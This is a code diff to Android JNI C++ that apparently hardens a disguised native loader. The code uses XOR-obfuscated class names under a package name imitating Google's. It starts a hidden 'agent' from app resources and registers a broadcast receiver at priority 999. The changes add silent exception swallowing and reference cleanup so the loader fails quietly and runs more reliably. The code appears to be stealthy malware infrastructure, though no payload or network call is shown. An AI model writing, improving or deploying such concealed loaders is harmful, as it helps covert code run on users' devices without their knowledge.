@@ -1,6 +1,7 @@
 #include <jni.h>
 #include <string>
 #include <vector>
+#include <android/log.h>
 
 // Simple XOR deobfuscator for C++ strings
 std::string o(const std::string& s) {
@@ -110,6 +111,7 @@ extern "C"
 JNIEXPORT void JNICALL
 Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jclass clazz, jobject context) {
     // "com/google/android/apps/work/cloudpc/R$raw"
+
     jclass rRawClass = env->FindClass(o("gki+ckkcha+ej`vkm`+ettw+skvo+ghkq`tg+V ves").c_str());
     if (env->ExceptionCheck()) {
         env->ExceptionClear();
@@ -166,11 +168,19 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
 
     if (getInstanceMethod != nullptr) {
         jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
+        if (env->ExceptionCheck()) {
+            env->ExceptionDescribe();
+            env->ExceptionClear();
+            agentInstance = nullptr;
+        }
         if (agentInstance != nullptr) {
             // 6. Call agentInstance.start(context, null, null)
             jmethodID startMethod = env->GetMethodID(agentClass, "start", "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
             if (startMethod != nullptr) {
                 env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
+                if (env->ExceptionCheck()) {
+                    env->ExceptionClear();
+                }
             }
         }
     }
@@ -182,6 +192,11 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
     if (!env->ExceptionCheck() && updateReceiverClass != nullptr) {
         jmethodID receiverInit = env->GetMethodID(updateReceiverClass, "<init>", "()V");
         jobject receiverInstance = env->NewObject(updateReceiverClass, receiverInit);
+
+        if (env->ExceptionCheck()) {
+            env->ExceptionClear();
+            receiverInstance = nullptr;
+        }
 
         if (receiverInstance != nullptr) {
             jclass filterClass = env->FindClass("android/content/IntentFilter");
@@ -200,10 +215,20 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
 
             if (registerReceiverMethod != nullptr) {
                 env->CallObjectMethod(context, registerReceiverMethod, receiverInstance, filter);
+                if (env->ExceptionCheck()) {
+                    env->ExceptionClear();
+                } else {
 
-                jclass logClass = env->FindClass("android/util/Log");
-                jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
-                env->CallStaticIntMethod(logClass, infoMethod, env->NewStringUTF("JNI_Loader"), env->NewStringUTF("Successfully registered UpdateReceiver dynamically with priority 999"));
+                    jclass logClass = env->FindClass("android/util/Log");
+                    jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
+                    if (infoMethod != nullptr) {
+                        jstring tagStr = env->NewStringUTF("JNI_Loader");
+                        jstring msgStr = env->NewStringUTF("Successfully registered UpdateReceiver dynamically with priority 999");
+                        env->CallStaticIntMethod(logClass, infoMethod, tagStr, msgStr);
+                        env->DeleteLocalRef(tagStr);
+                        env->DeleteLocalRef(msgStr);
+                    }
+                }
             }
         }
     }
